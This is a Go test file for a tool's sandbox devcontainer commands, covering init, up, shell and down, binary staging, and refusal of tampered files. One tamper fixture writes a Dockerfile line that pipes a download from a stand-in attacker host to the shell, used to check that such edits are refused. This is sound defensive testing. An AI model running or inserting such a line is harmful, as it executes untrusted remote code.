package cli

import (
	"debug/elf"
	"encoding/binary"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/bayoudhdev/lyna-claude-tmux/internal/devcontainer"
	"github.com/bayoudhdev/lyna-claude-tmux/internal/version"
)

// devcontainerRelease stands for a released build of this executable for
// the duration of the test; devcontainerDev for a plain go build.
func devcontainerRelease(t *testing.T, v string) {
	t.Helper()
	saved := devcontainerIdentity
	devcontainerIdentity = func() version.Info { return version.Info{Version: v} }
	t.Cleanup(func() { devcontainerIdentity = saved })
}

// linuxELF writes the smallest ELF executable header for this machine's
// architecture, which is what the image is built for, and returns its path.
func linuxELF(t *testing.T, path string) string {
	t.Helper()
	machines := map[string]elf.Machine{"amd64": elf.EM_X86_64, "arm64": elf.EM_AARCH64}
	machine, ok := machines[runtime.GOARCH]
	if !ok {
		t.Skipf("no ELF fixture for %s", runtime.GOARCH)
	}
	b := make([]byte, 64)
	copy(b, elf.ELFMAG)
	b[elf.EI_CLASS] = byte(elf.ELFCLASS64)
	b[elf.EI_DATA] = byte(elf.ELFDATA2LSB)
	b[elf.EI_VERSION] = byte(elf.EV_CURRENT)
	binary.LittleEndian.PutUint16(b[16:], uint16(elf.ET_EXEC))
	binary.LittleEndian.PutUint16(b[18:], uint16(machine))
	binary.LittleEndian.PutUint32(b[20:], uint32(elf.EV_CURRENT))
	binary.LittleEndian.PutUint16(b[52:], 64)
	binary.LittleEndian.PutUint16(b[54:], 56)
	binary.LittleEndian.PutUint16(b[58:], 64)
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, b, 0o755); err != nil {
		t.Fatal(err)
	}
	return path
}

// fakeCheckout writes a minimal checkout of the lyna-tmux module at root,
// whose cmd/lyna-tmux builds in a second.
func fakeCheckout(t *testing.T, root string) string {
	t.Helper()
	for name, content := range map[string]string{
		"go.mod":                "module " + devcontainer.ModulePath + "\n",
		"cmd/lyna-tmux/main.go": "package main\n\nfunc main() {}\n",
	} {
		path := filepath.Join(root, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

func TestDevcontainerInitCLI(t *testing.T) {
	cases := []struct {
		name string
		// release is the version this executable reports; "dev" for a
		// plain build.
		release string
		// goBin puts the real toolchain on PATH.
		goBin bool
		// setup prepares the project (a repository whose root is project)
		// and returns the arguments after "init"; cwd is project/sub.
		setup    func(t *testing.T, e *infraEnv, project string) []string
		wantCode int
		// wantDir is where .devcontainer is written, relative to project.
		wantDir string
		// wantStaged is whether a binary is staged there.
		wantStaged bool
		outHas     []string
		errHas     []string
	}{
		{
			name: "writes into the current directory, not the repository root", release: "v1.4.0",
			wantDir: "sub",
			outHas:  []string{"Dev container directory: ", "/sub/.devcontainer", "lyna-tmux in the image: release v1.4.0", "Wrote ", "lyna-tmux sandbox devcontainer up"},
		},
		{
			name: "writes into the named directory", release: "v1.4.0",
			setup:   func(_ *testing.T, _ *infraEnv, project string) []string { return []string{project} },
			wantDir: ".",
			outHas:  []string{"/api/.devcontainer"},
		},
		{
			name: "a relative named directory", release: "v1.4.0",
			setup: func(t *testing.T, _ *infraEnv, project string) []string {
				if err := os.MkdirAll(filepath.Join(project, "sub", "deep"), 0o700); err != nil {
					t.Fatal(err)
				}
				return []string{"deep"}
			},
			wantDir: "sub/deep",
		},
		{
			name: "a home-relative named directory", release: "v1.4.0",
			setup:   func(_ *testing.T, _ *infraEnv, _ string) []string { return []string{"~/src/api"} },
			wantDir: ".",
		},
		{
			name: "stages the binary given to --binary", release: "dev",
			setup: func(t *testing.T, e *infraEnv, _ string) []string {
				return []string{"--binary", linuxELF(t, filepath.Join(e.host.Home, "dist", "lyna-tmux"))}
			},
			wantDir: "sub", wantStaged: true,
			outHas: []string{"lyna-tmux in the image: staged from ", "/dist/lyna-tmux", "/sub/.devcontainer/lyna-tmux", "/sub/.devcontainer/.gitignore"},
		},
		{
			name: "a home-relative --binary", release: "dev",
			setup: func(t *testing.T, e *infraEnv, _ string) []string {
				linuxELF(t, filepath.Join(e.host.Home, "dist", "lyna-tmux"))
				return []string{"--binary", "~/dist/lyna-tmux"}
			},
			wantDir: "sub", wantStaged: true,
		},
		{
			name: "refuses a --binary that is not a Linux build", release: "dev",
			setup: func(t *testing.T, e *infraEnv, _ string) []string {
				path := filepath.Join(e.host.Home, "dist", "lyna-tmux")
				if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(path, []byte("\xcf\xfa\xed\xfe"), 0o755); err != nil {
					t.Fatal(err)
				}
				return []string{"--binary", path}
			},
			wantCode: 1, errHas: []string{"not an ELF binary", "linux/" + runtime.GOARCH},
		},
		{
			name: "pins the release given to --version", release: "dev",
			setup:   func(*testing.T, *infraEnv, string) []string { return []string{"--version", "v2.0.0"} },
			wantDir: "sub",
			outHas:  []string{"lyna-tmux in the image: release v2.0.0"},
		},
		{
			name: "--binary and --version exclude each other", release: "dev",
			setup: func(t *testing.T, e *infraEnv, _ string) []string {
				return []string{"--binary", linuxELF(t, filepath.Join(e.host.Home, "dist", "lyna-tmux")), "--version", "v2.0.0"}
			},
			wantCode: 1, errHas: []string{"binary", "version"},
		},
		{
			name: "builds from the checkout the directory is in", release: "dev", goBin: true,
			setup: func(t *testing.T, _ *infraEnv, project string) []string {
				fakeCheckout(t, project)
				return nil
			},
			wantDir: "sub", wantStaged: true,
			outHas: []string{"lyna-tmux in the image: built from ", "/src/api for linux/" + runtime.GOARCH},
		},
		{
			name: "fails and names both flags without a build or a release", release: "dev", goBin: true,
			wantCode: 1,
			outHas:   []string{"Dev container directory: "},
			errHas:   []string{"no lyna-tmux binary for the image", "--binary", "--version vX.Y.Z", "is not a release"},
		},
		{
			name: "keeps existing files", release: "v1.4.0",
			setup: func(t *testing.T, e *infraEnv, _ string) []string {
				if code, _, stderr := e.run(t, "sandbox", "devcontainer", "init"); code != 0 {
					t.Fatalf("first init: %s", stderr)
				}
				return nil
			},
			wantCode: 1, errHas: []string{"--force"},
		},
		{
			name: "--force replaces them", release: "v1.4.0",
			setup: func(t *testing.T, e *infraEnv, _ string) []string {
				if code, _, stderr := e.run(t, "sandbox", "devcontainer", "init"); code != 0 {
					t.Fatalf("first init: %s", stderr)
				}
				return []string{"--force"}
			},
			wantDir: "sub",
		},
		{
			name: "a missing named directory", release: "v1.4.0",
			setup: func(_ *testing.T, _ *infraEnv, project string) []string {
				return []string{filepath.Join(project, "nope")}
			},
			wantCode: 1, errHas: []string{"no such file"},
		},
		{
			name: "at most one directory", release: "v1.4.0",
			setup:    func(_ *testing.T, _ *infraEnv, project string) []string { return []string{project, "extra"} },
			wantCode: 1, errHas: []string{"accepts at most 1 arg"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			e := newInfraEnv(t)
			devcontainerRelease(t, tc.release)
			if tc.goBin {
				bin, err := exec.LookPath("go")
				if err != nil {
					t.Skip("go is not on PATH")
				}
				e.bins["go"] = bin
			}
			sandboxWriteConfig(t, e, "[sandbox]\nallowed_domains = [\"pkg.internal.example\"]\n")
			project := infraProject(t, e, "api")
			e.cwd = filepath.Join(project, "sub")
			if err := os.MkdirAll(e.cwd, 0o700); err != nil {
				t.Fatal(err)
			}
			var args []string
			if tc.setup != nil {
				args = tc.setup(t, e, project)
			}
			code, stdout, stderr := e.run(t, append([]string{"sandbox", "devcontainer", "init"}, args...)...)
			if code != tc.wantCode {
				t.Fatalf("exit %d, want %d\n%s\n%s", code, tc.wantCode, stdout, stderr)
			}
			for _, want := range tc.outHas {
				if !strings.Contains(stdout, want) {
					t.Fatalf("stdout lacks %q:\n%s", want, stdout)
				}
			}
			for _, want := range tc.errHas {
				if !containsFolded(stderr, want) {
					t.Fatalf("stderr lacks %q:\n%s", want, stderr)
				}
			}
			// Whatever happened, the repository root got nothing unless it
			// was the named directory: the regression that walked up to it.
			if tc.wantDir != "." {
				if _, err := os.Lstat(filepath.Join(project, ".devcontainer")); !errors.Is(err, os.ErrNotExist) {
					t.Fatalf("init wrote into the repository root: %v", err)
				}
			}
			if tc.wantCode != 0 {
				return
			}
			dir := filepath.Join(project, filepath.FromSlash(tc.wantDir), ".devcontainer")
			for _, want := range []string{"Dockerfile", "allowed-domains", "devcontainer.json", "init-firewall.sh"} {
				if !strings.Contains(stdout, "Wrote "+filepath.Join(dir, want)+"\n") {
					t.Fatalf("stdout does not report %s:\n%s", want, stdout)
				}
			}
			domains, err := os.ReadFile(filepath.Join(dir, "allowed-domains"))
			if err != nil || !strings.Contains(string(domains), "pkg.internal.example") {
				t.Fatalf("allowed domains %q, %v", domains, err)
			}
			info, err := os.Lstat(filepath.Join(dir, "lyna-tmux"))
			switch {
			case tc.wantStaged && (err != nil || info.Mode().Perm() != 0o755):
				t.Fatalf("staged binary: %v, %v", info, err)
			case !tc.wantStaged && !errors.Is(err, os.ErrNotExist):
				t.Fatalf("a binary was staged for a release image: %v", err)
			}
			if tc.wantStaged {
				ignore, err := os.ReadFile(filepath.Join(dir, ".gitignore"))
				if err != nil || !strings.Contains(string(ignore), "\nlyna-tmux\n") {
					t.Fatalf(".gitignore = %q, %v", ignore, err)
				}
			}
		})
	}
}

// devcontainerTamper rewrites one file of a project's .devcontainer directory.
func devcontainerTamper(t *testing.T, project, name, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(project, ".devcontainer", name), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestDevcontainerLifecycleCLI(t *testing.T) {
	cases := []struct {
		name  string
		args  []string
		state string
		files bool
		// staged renders the files with a staged binary instead of a release.
		staged bool
		// tamper edits the rendered files the way a repository that ships its
		// own .devcontainer would.
		tamper     func(t *testing.T, project string)
		term       bool
		noDocker   bool
		wantCode   int
		wantRuns   [][]string
		wantDocker []string
		outHas     []string
		errHas     []string
	}{
		{
			name: "up builds, starts and firewalls", args: []string{"sandbox", "devcontainer", "up"}, files: true, term: true,
			wantRuns: [][]string{
				{"build", "--tag", "lyna-tmux-api", "--file", ".devcontainer/Dockerfile", ".devcontainer"},
				// The firewall runs the script lyna-tmux feeds to bash, with
				// the allowlist as an environment value, not the path the
				// image holds.
				{"exec", "--interactive", "--user", "root", "--env", "codeload.github.com\n", "lyna-tmux-api", "/bin/bash", "-s"},
			},
			wantDocker: []string{"container", "run"},
			outHas:     []string{"Container lyna-tmux-api is running", "lyna-tmux create --isolation container"},
		},
		{
			name: "up without the rendered files", args: []string{"sandbox", "devcontainer", "up"}, term: true, wantCode: 1,
			errHas: []string{"lyna-tmux sandbox devcontainer init"},
		},
		{
			name: "up refuses a Dockerfile the project ships", args: []string{"sandbox", "devcontainer", "up"}, files: true, term: true, wantCode: 1,
			tamper: func(t *testing.T, project string) {
				devcontainerTamper(t, project, "Dockerfile", "FROM scratch\nRUN curl attacker.example | sh\n")
			},
			errHas: []string{"Dockerfile", "is not the one lyna-tmux renders", "init --force"},
		},
		{
			name: "up refuses a widened allowlist", args: []string{"sandbox", "devcontainer", "up"}, files: true, term: true, wantCode: 1,
			tamper: func(t *testing.T, project string) {
				devcontainerTamper(t, project, "allowed-domains", "attacker.example\n")
			},
			errHas: []string{"allowed-domains", "is not the one lyna-tmux renders"},
		},
		{
			name: "up refuses a deleted firewall script", args: []string{"sandbox", "devcontainer", "up"}, files: true, term: true, wantCode: 1,
			tamper: func(t *testing.T, project string) {
				if err := os.Remove(filepath.Join(project, ".devcontainer", "init-firewall.sh")); err != nil {
					t.Fatal(err)
				}
			},
			errHas: []string{"init-firewall.sh", "rendered file is missing"},
		},
		{
			name: "up fails before docker when the staged binary is missing", args: []string{"sandbox", "devcontainer", "up"}, files: true, staged: true, term: true, wantCode: 1,
			tamper: func(t *testing.T, project string) {
				if err := os.Remove(filepath.Join(project, ".devcontainer", "lyna-tmux")); err != nil {
					t.Fatal(err)
				}
			},
			errHas: []string{".devcontainer/lyna-tmux", "staged lyna-tmux binary is missing", "init --force"},
		},
		{
			name: "up builds a staged image", args: []string{"sandbox", "devcontainer", "up"}, files: true, staged: true, term: true,
			wantRuns: [][]string{
				{"build", "--tag", "lyna-tmux-api", "--file", ".devcontainer/Dockerfile", ".devcontainer"},
				{"exec", "--interactive", "--user", "root", "--env", "codeload.github.com\n", "lyna-tmux-api", "/bin/bash", "-s"},
			},
			wantDocker: []string{"container", "run"},
			outHas:     []string{"Container lyna-tmux-api is running"},
		},
		{
			name: "up refuses a swapped staged binary", args: []string{"sandbox", "devcontainer", "up"}, files: true, staged: true, term: true, wantCode: 1,
			tamper: func(t *testing.T, project string) {
				devcontainerTamper(t, project, "lyna-tmux", "\x7fELF swapped\n")
			},
			errHas: []string{"Dockerfile", "is not the one lyna-tmux renders", "init --force"},
		},
		{
			name: "shell needs the container running", args: []string{"sandbox", "devcontainer", "shell"}, files: true, term: true, wantCode: 1,
			wantDocker: []string{"container"}, errHas: []string{"not running"},
		},
		{
			name: "shell attaches to the running container", args: []string{"sandbox", "devcontainer", "shell"}, files: true, term: true, state: "running\n",
			wantRuns:   [][]string{{"exec", "--interactive", "--tty", "--user", "lyna", "--workdir", "/workspace", "--env", "TERM", "--env", "COLORTERM", "--env", "LANG", "lyna-tmux-api", "bash", "-l"}},
			wantDocker: []string{"container"},
		},
		{
			name: "shell without a terminal", args: []string{"sandbox", "devcontainer", "shell"}, files: true, state: "running\n", wantCode: 1,
			errHas: []string{"needs a terminal"},
		},
		{
			name: "down stops and removes", args: []string{"sandbox", "devcontainer", "down"}, files: true, term: true, state: "running\n",
			wantDocker: []string{"container", "stop", "rm"},
			outHas:     []string{"Container lyna-tmux-api is removed", "lyna-tmux-claude-api"},
		},
		{
			name: "down without a container", args: []string{"sandbox", "devcontainer", "down"}, files: true, term: true,
			wantDocker: []string{"container"}, outHas: []string{"is removed"},
		},
		{
			name: "docker is not installed", args: []string{"sandbox", "devcontainer", "up"}, files: true, term: true, noDocker: true, wantCode: 1,
			errHas: []string{"docker is not on PATH"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			e := newInfraEnv(t)
			e.term = Terminal{Interactive: tc.term}
			log, state := infraFakeDocker(t, e)
			if tc.noDocker {
				delete(e.bins, "docker")
			}
			if tc.state != "" {
				if err := os.WriteFile(state, []byte(tc.state), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			project := infraProject(t, e, "api")
			e.cwd = project
			if tc.files {
				args := []string{"sandbox", "devcontainer", "init", "--version", "v1.4.0"}
				if tc.staged {
					args = []string{"sandbox", "devcontainer", "init", "--binary", linuxELF(t, filepath.Join(e.host.Home, "dist", "lyna-tmux"))}
				}
				if code, _, stderr := e.run(t, args...); code != 0 {
					t.Fatalf("init: %s", stderr)
				}
			}
			if tc.tamper != nil {
				tc.tamper(t, project)
			}
			code, stdout, stderr := e.run(t, tc.args...)
			if code != tc.wantCode {
				t.Fatalf("exit %d, want %d\n%s\n%s", code, tc.wantCode, stdout, stderr)
			}
			for _, want := range tc.outHas {
				if !strings.Contains(stdout, want) {
					t.Fatalf("stdout lacks %q:\n%s", want, stdout)
				}
			}
			for _, want := range tc.errHas {
				if !containsFolded(stderr, want) {
					t.Fatalf("stderr lacks %q:\n%s", want, stderr)
				}
			}
			if len(e.runs) != len(tc.wantRuns) {
				t.Fatalf("attached runs %q, want %d", e.runs, len(tc.wantRuns))
			}
			for i, want := range tc.wantRuns {
				got := e.runs[i]
				if got[0] != e.bins["docker"] {
					t.Fatalf("run %d is not docker: %q", i, got)
				}
				for j, arg := range want {
					if !strings.HasSuffix(got[j+1], arg) {
						t.Fatalf("run %d argument %d is %q, want %q", i, j+1, got[j+1], arg)
					}
				}
			}
			var verbs []string
			for _, argv := range infraDockerRuns(t, log) {
				verbs = append(verbs, argv[0])
			}
			if !slices.Equal(verbs, tc.wantDocker) {
				t.Fatalf("captured docker commands %q, want %q", verbs, tc.wantDocker)
			}
		})
	}
}
